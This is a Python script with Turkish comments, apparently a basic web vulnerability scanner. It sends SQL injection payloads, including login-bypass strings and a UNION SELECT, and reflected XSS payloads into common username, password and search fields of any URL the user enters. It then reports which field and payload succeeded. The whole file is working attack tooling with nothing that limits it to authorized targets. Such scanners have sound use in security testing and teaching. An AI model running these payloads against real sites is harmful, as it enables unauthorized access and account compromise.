import requests
import time

def scanner_v5(target_url, mode="ALL"):
    print(f"\n{'='*70}")
    print(f"[*] WEB VULNERABILITY SCANNER v5.0 (SQLi + XSS)")
    print(f"[*] Hedef: {target_url}")
    print(f"[*] Mod: {mode}")
    print(f"{'='*70}\n")

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    # Hedef Inputlar
    input_fields = ['uname', 'pass', 'user_login', 'user_pass', 'search', 'q', 'query', 'id']

    # --- 1. MODÜL: SQL INJECTION ---
    if mode == "ALL" or mode == "SQL":
        print("[*] SQL Injection Taraması Başlatılıyor...")
        # Basit ve etkili SQL Payloadları
        sql_payloads = ["' OR '1'='1", '" OR "1"="1', "admin' --", "' OR 1=1 --", "' UNION SELECT 1,version()--"]
        
        with requests.Session() as s:
            for payload in sql_payloads:
                for field in input_fields:
                    data = {f: payload if f == field else "test" for f in input_fields}
                    try:
                        response = s.post(target_url, data=data, headers=headers, timeout=10)
                        
                        # Error Based Kontrolü
                        errors = ["SQL syntax", "mysql_fetch", "MariaDB", "Welcome", "logout", "user info"]
                        for err in errors:
                            if err in response.text:
                                print(f"[!!!] SQLi BULUNDU! ({err})")
                                print(f"      Payload: {payload}")
                                print(f"      Alan: {field}")
                                return # İlk bulduğunda dur
                    except: pass
        print("[-] SQL Taraması Bitti.\n")

    # --- 2. MODÜL: XSS (Cross-Site Scripting) ---
    if mode == "ALL" or mode == "XSS":
        print("[*] XSS (Reflected) Taraması Başlatılıyor...")
        
        # XSS Payloadları (Zararsız Alert kutuları)
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'><svg/onload=alert(1)>"
        ]

        with requests.Session() as s:
            for payload in xss_payloads:
                for field in input_fields:
                    data = {f: payload if f == field else "test" for f in input_fields}
                    try:
                        # XSS genelde hem GET hem POST ile çalışır. Önce POST deneyelim.
                        response = s.post(target_url, data=data, headers=headers, timeout=10)
                        
                        # KONTROL: Gönderdiğimiz kod sayfada AYNEN (sansürlenmeden) var mı?
                        if payload in response.text:
                            print(f"[!!!] XSS ZAFİYETİ BULUNDU!")
                            print(f"      Payload: {payload}")
                            print(f"      Alan: {field}")
                            print(f"      Not: Tarayıcıda bu kodu girerseniz bir uyarı kutusu çıkar.")
                            return # İlk bulduğunda dur
                    except: pass
        print("[-] XSS Taraması Bitti.")

if __name__ == "__main__":
    target = input("Hedef URL (Örn: http://testphp.vulnweb.com/userinfo.php): ").strip()
    print("\nMod Seçin: \n1- Sadece SQLi\n2- Sadece XSS\n3- Hepsi (Varsayılan)")
    choice = input("Seçim: ").strip()

    if choice == "1": mode = "SQL"
    elif choice == "2": mode = "XSS"
    else: mode = "ALL"

    if target:
        scanner_v5(target, mode)
    
    input("\nÇıkmak için Enter...")
